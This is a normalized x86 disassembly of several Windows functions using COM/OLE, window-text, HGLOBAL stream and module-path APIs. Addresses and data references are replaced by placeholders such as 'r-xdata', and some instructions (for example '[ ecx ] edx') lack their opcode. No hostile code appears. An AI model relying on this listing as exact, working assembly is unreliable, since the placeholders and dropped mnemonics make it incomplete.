mov eax [ esi + 0x70 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ ebp - 0x10 ]
cmp eax edi
je r-xdata
mov [ esi + 0x90 ] edi
mov eax [ esi + 0x74 ]
cmp eax edi
je r-xdata
mov [ esi + 0x70 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push edi
push eax
call edx
mov eax [ esi + 0x64 ]
cmp eax edi
je r-xdata
mov [ esi + 0x74 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x60 ]
cmp eax edi
je r-xdata
mov [ esi + 0x64 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x6c ]
cmp eax edi
je r-xdata
mov [ esi + 0x60 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x68 ]
cmp eax edi
je r-xdata
mov [ esi + 0x6c ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0xc4 ]
and [ esi + 0x98 ] 0xffffffa4
cmp eax edi
je r-xdata
mov [ esi + 0x68 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push eax
call [ DestroyAcceleratorTable@IAT ]
mov [ esi + 0xc4 ] edi
sub_40a9e0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a3e9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov [ eax ] ebx
mov edi 0x8007000e
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
push 0xf4
call [ operator new@IAT ]
add esp 0x4
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
push esi
lea eax [ esi + 0x8 ]
push eax
call sub_40a170
mov [ ebp - 0x4 ] 0x2
mov ecx [ rw-data ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc [ esi + 0x4 ]
dec [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
push edx
push r--data
push esi
mov eax [ ecx ]
call eax
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
mov eax [ edx + 0xc ]
call eax
sub_40ab10
push ebp
mov ebp esp
push 0xffffffff
push sub_44aa96
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call sub_40b000
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x10 ]
push eax
call sub_40a9e0
mov edi eax
cmp edi ebx
jl r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
cmp esi ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jl r-xdata
push esi
call [ SysAllocString@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
cmp esi ebx
jne r-xdata
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ eax ] ebx
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
mov edx [ ebp + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push edx
push ebx
push r--data
lea edx [ ebp - 0x18 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push esi
push eax
mov eax [ ecx + 0x28 ]
call eax
mov edi eax
mov [ ebp - 0x4 ] 0x5
push esi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_402d00
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40ac40
push ebp
mov ebp esp
push 0xffffffff
push sub_44b4e4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
je r-xdata
xor esi esi
push esi
call [ OleInitialize@IAT ]
push ebx
call [ GetWindowTextLengthW@IAT ]
mov edi eax
lea eax [ edi + edi + 0xa ]
cmp eax 0x400
ja r-xdata
sub eax 0x81
je r-xdata
push eax
call [ malloc@IAT ]
add esp 0x4
cmp eax esi
je r-xdata
call sub_444b80
mov eax esp
cmp eax esi
je r-xdata
push 0xffffffeb
push ebx
call [ GetWindowLongW@IAT ]
test eax eax
je r-xdata
sub eax 0x18e
jne r-xdata
mov [ ebp - 0x20 ] eax
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xcccc
add eax 0x8
call [ OleUninitialize@IAT ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
push eax
push ecx
push ebx
call [ DefWindowProcW@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
inc edi
push edi
push eax
push ebx
call [ GetWindowTextW@IAT ]
push r--data
push ebx
call [ SetWindowTextW@IAT ]
mov eax [ ebp + 0x14 ]
xor edi edi
mov [ ebp - 0x2c ] esi
cmp eax esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x1c ] esi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x2
cmp edi esi
je r-xdata
mov eax [ eax ]
cmp eax esi
je r-xdata
lea esp [ ebp - 0x3c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov esi [ GetWindowLongW@IAT ]
push 0xffffffec
push eax
call esi
test eax 0x10000
je r-xdata
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
push eax
call sub_404140
xor esi esi
add esp 0x4
cmp eax esi
jge r-xdata
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
movzx edi [ eax ]
push 0xffffffec
push ebx
call esi
or eax 0x10000
push eax
push 0xffffffec
push ebx
call [ SetWindowLongW@IAT ]
jmp r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x7
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx [ ebp - 0x20 ]
push edx
push ebx
call sub_40ab10
cmp eax esi
jge r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
cmp eax esi
je r-xdata
xor esi esi
push esi
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
push eax
add ecx 0x2
mov eax edi
mov edx edi
call sub_402480
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp - 0x2c ]
push ecx
push r--data
push eax
call edx
cmp eax esi
jl r-xdata
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
mov [ ebp - 0x4 ] 0x3
lea esi [ ebp - 0x24 ]
call sub_409b30
mov [ ebp - 0x4 ] 0x2
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
push ecx
call sub_40a500
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x1c ]
call sub_404110
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
add eax 0xfffffff8
cmp [ eax ] 0xdddd
jne r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ ebp - 0x2c ]
push edx
push 0xffffffeb
push ebx
call [ SetWindowLongW@IAT ]
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0x18 ]
push eax
call sub_40a500
mov [ ebp - 0x4 ] 0x3
lea esi [ ebp - 0x24 ]
call sub_409b30
mov [ ebp - 0x4 ] 0x2
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
push ecx
call sub_40a500
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x1c ]
call sub_404110
mov [ ebp - 0x1c ] esi
or eax 0xffffffff
jmp r-xdata
push eax
call [ free@IAT ]
add esp 0x4
sub_40af40
push ebp
mov ebp esp
push 0xffffffff
push sub_446455
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx [ esi ]
cmp ebx edx
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
add [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov dx [ ebx ]
mov [ eax ] dx
test eax eax
jne r-xdata
lea edi [ edx + eax * 2 ]
cmp ebx edi
jae r-xdata
lea edi [ ecx + ecx ]
test edi edi
js r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_402d00
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
cmp edi 0x3fffffff
ja r-xdata
push 0x2
push edi
push edx
call [ _recalloc@IAT ]
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] eax
sub_40b000
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b6e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x14 ] rw-data
mov [ esp + 0x18 ] bl
mov [ esp + 0x58 ] ebx
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ RegisterWindowMessageW@IAT ]
push r--data
mov [ esp + 0x1c ] 0x1
call esi
push r--data
mov [ rw-data ] eax
call esi
mov ecx [ rw-data ]
mov [ rw-data ] eax
lea eax [ esp + 0x1c ]
push eax
push r--data
mov edi 0x30
push ecx
mov [ esp + 0x28 ] edi
call [ GetClassInfoExW@IAT ]
cmp eax ebx
jne r-xdata
push edi
lea ecx [ esp + 0x20 ]
push ebx
push ecx
call memset
mov eax [ rw-data ]
add esp 0xc
lea edx [ esp + 0x1c ]
push edx
push r--data
push eax
mov [ esp + 0x28 ] edi
call [ GetClassInfoExW@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
mov edx [ rw-data ]
push 0x7f00
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] 0x8
mov [ esp + 0x2c ] sub_403e20
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] ebx
call [ LoadCursorW@IAT ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x40 ] 0x6
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] r--data
mov [ esp + 0x4c ] ebx
call [ RegisterClassExW@IAT ]
movzx eax ax
mov [ esp + 0x10 ] eax
cmp ax bx
je r-xdata
mov [ esp + 0x58 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov [ esp + 0x18 ] bl
mov eax esi
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x7f00
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] 0x8
mov [ esp + 0x2c ] sub_40ac40
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ebx
call [ LoadCursorW@IAT ]
lea edx [ esp + 0x1c ]
push edx
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] 0x6
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] r--data
mov [ esp + 0x4c ] ebx
call [ RegisterClassExW@IAT ]
movzx eax ax
mov [ esp + 0x10 ] eax
cmp ax bx
je r-xdata
xor esi esi
lea ebx [ esp + 0x10 ]
mov esi rw-data
call sub_40af40
xor ebx ebx
lea ebx [ esp + 0x10 ]
mov esi rw-data
call sub_40af40
mov esi 0x1
xor ebx ebx
jmp r-xdata
sub_40b1f0
push esi
mov esi [ rw-data ]
mov [ rw-data ] 0x0
cmp esi [ rw-data ]
jae r-xdata
xor eax eax
pop esi
retn
lea esp [ esp ]
add esi 0x4
cmp esi [ rw-data ]
jb r-xdata
mov eax [ eax + 0x20 ]
push 0x1
call eax
mov eax [ esi ]
test eax eax
je r-xdata
sub_40b230
push ebp
mov ebp esp
push 0xffffffff
push sub_4452dc
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
call sub_40b1f0
mov esi eax
mov [ ebp - 0x14 ] esi
xor ebx ebx
cmp esi ebx
jl r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetCurrentThreadId@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ebx
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] bl
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x4 ] bl
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov [ rw-data ] ebx
mov eax esi
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b310
push ebp
mov ebp esp
push 0xffffffff
push sub_448145
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x8 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0xc ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x5
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x10 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x7
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x14 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x9
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x18 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xb
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x20 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xd
mov [ esi + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40b440
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40b470
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40b470
push ebp
mov ebp esp
push 0xffffffff
push sub_446435
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx 0x5
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or edi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov cl 0x4
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x14 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x10 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor cl cl
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] edi
lea eax [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] edi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_40b5f0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ StrStrIW@IAT ]
mov esi ecx
push r--data
push esi
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn
push 0x3d
push esi
call [ wcschr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push r--data
add esi 0x2
push esi
call edi
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
sub eax esi
sar eax 0x1
jmp r-xdata
push eax
push esi
lea edx [ ebp - 0x20c ]
push edx
call [ lstrcpynW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov ecx ebx
call sub_40b6c0
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x1 ]
mov edi eax
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x20a ]
push ecx
mov [ ebp - 0x20c ] ax
call memset
add esp 0xc
mov eax 0x104
cmp edi 0x104
jae r-xdata
sub_40b6c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44aa0b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x660
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x658 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x670 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor ecx ecx
push 0x206
push ecx
lea edx [ esp + 0x56 ]
push edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x58 ] cx
call memset
mov ecx [ rw-data ]
add esp 0xc
push 0x104
lea eax [ esp + 0x50 ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x104
lea edx [ esp + 0x5c ]
push edx
push r--data
push eax
call [ Ordinal_crt_33@IAT ]
add esp 0x1c
lea ecx [ esp + 0x4c ]
push ecx
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x678 ] 0x1
lea edx [ esp + 0x14 ]
push edx
push r--data
push 0x17
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
js r-xdata
mov [ esp + 0x678 ] 0xffffffff
mov eax [ esp + 0x14 ]
test eax eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0xfc ]
push 0x0
push eax
call edx
lea edi [ esp + 0x4c ]
lea esi [ esp + 0x3c ]
call sub_405ef0
mov [ esp + 0x678 ] 0x3
mov edi [ eax ]
mov edx [ esp + 0x14 ]
mov esi [ edx ]
lea ecx [ esp + 0x34 ]
push ecx
sub esp 0x10
mov ecx esp
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edi [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ecx + 0x8 ] edi
mov [ ecx + 0xc ] eax
mov ecx [ esi + 0xe8 ]
push edx
call ecx
mov [ esp + 0x678 ] 0x1
lea edx [ esp + 0x3c ]
push edx
call [ VariantClear@IAT ]
xor esi esi
cmp [ esp + 0x34 ] si
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x1c ] eax
mov [ esp + 0x678 ] 0x6
mov eax [ esp + 0x2c ]
push eax
push r--data
lea edi [ esp + 0x24 ]
call sub_401dc0
mov eax [ esp + 0x24 ]
add esp 0x8
cmp eax esi
jne r-xdata
mov [ esp + 0x678 ] 0xffffffff
mov eax [ esp + 0x14 ]
cmp eax esi
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov [ esp + 0x30 ] eax
cmp eax esi
jne r-xdata
xor edi edi
mov [ esp + 0x30 ] edi
jmp r-xdata
je r-xdata
mov edi [ esp + 0x30 ]
push 0x8007000e
call sub_402d00
mov [ esp + 0x678 ] 0x7
mov [ esp + 0x18 ] esi
mov [ esp + 0x678 ] 0x9
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push edi
push eax
mov eax [ ecx + 0x94 ]
call eax
cmp [ esp + 0x18 ] esi
jne r-xdata
mov [ esp + 0x10 ] esi
mov [ esp + 0x678 ] 0xb
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov eax [ esp + 0x10 ]
cmp eax esi
jne r-xdata
mov [ esp + 0x678 ] 0x7
lea ecx [ esp + 0x18 ]
push ecx
call sub_40a500
mov [ esp + 0x678 ] 0x6
push edi
call [ SysFreeString@IAT ]
mov [ esp + 0x678 ] 0x1
lea ecx [ esp + 0x1c ]
call sub_402ca0
mov [ esp + 0x678 ] 0xffffffff
lea edx [ esp + 0x14 ]
push edx
call sub_40a500
mov eax 0x1
jmp r-xdata
push r--data
lea edi [ ebx + 0x4 ]
push eax
call sub_40be00
mov ecx [ esp + 0x10 ]
push r--data
lea edi [ ebx + 0x8 ]
push ecx
mov [ esp + 0x34 ] edi
call sub_40be00
mov edx [ esp + 0x10 ]
push r--data
lea edi [ ebx + 0xc ]
push edx
mov [ esp + 0x40 ] edi
call sub_40be00
mov eax [ esp + 0x10 ]
push r--data
lea edi [ ebx + 0x14 ]
push eax
call sub_40be00
lea ecx [ esp + 0x24 ]
push ecx
call sub_402d40
mov [ esp + 0x678 ] 0xc
mov edx [ esp + 0x10 ]
push r--data
push edx
lea edi [ esp + 0x2c ]
call sub_40be00
mov eax [ esp + 0x24 ]
